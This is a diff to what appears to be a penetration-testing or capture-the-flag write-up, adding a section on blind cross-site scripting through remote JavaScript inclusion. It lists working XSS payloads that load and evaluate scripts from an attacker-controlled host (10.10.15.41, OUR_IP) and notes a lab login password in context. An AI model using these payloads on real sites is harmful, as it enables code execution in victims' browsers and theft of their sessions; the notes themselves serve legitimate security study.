@@ -123,6 +123,23 @@ username=admin&password=p1zd0nt57341myp455
 
 >Identify vulnerable input field with sample javascript payload: `<script src="http://OUR_IP/username"></script>`  
 
+### Remote JS File Include  
+
+>Using below payload to test how to escape and load remote JavaScript file.
+
+```html
+<script src=http://10.10.15.41/1></script>
+'><script src=http://10.10.15.41/2></script>
+"><script src=http://10.10.15.41/3></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```  
+
+>Successfully Identified the URL field with this payload: `"><script src=http://10.10.15.41/3l33t.js></script>`, Loading a Remote Script.  
+
+
+
 
 
 
